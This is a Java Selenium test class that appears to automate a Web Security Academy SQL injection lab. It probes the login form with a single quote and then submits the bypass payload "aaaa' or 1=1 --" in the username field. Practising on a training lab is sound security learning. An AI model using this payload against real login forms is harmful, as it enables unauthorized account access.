...
public class SQLInj_2_LoginByoass {
//    public final WebDriver chromeDriver;
    @Autowired
    public WebDriver chromeDriver;
    public Wait<WebDriver> waitDriver;
    private final String url = "https://0ad3005c041251f482e110bd0091004d.web-security-academy.net/";
    ...
    @FindBy(how = How.CSS, css = "input[name='username']")
    private WebElement inputUsernameElement;
    @FindBy(how = How.CSS, css = "input[name='password']")
    private WebElement inputPasswordElement;
    @FindBy(how = How.CSS, css = "button.button")
    private WebElement loginButtonElement;

    @FindBy(how = How.TAG_NAME, tagName = "pre")
    private WebElement internalServerErrorElement;
    private void findError(){
        chromeDriver.navigate().to(url+"login");

        inputUsernameElement.sendKeys("aaaa'");
        inputPasswordElement.sendKeys("123");
    ...
    private void attack(){
        ...
        inputUsernameElement.sendKeys("aaaa' or 1=1 --");
        inputPasswordElement.sendKeys("123");
        loginButtonElement.submit();
    }
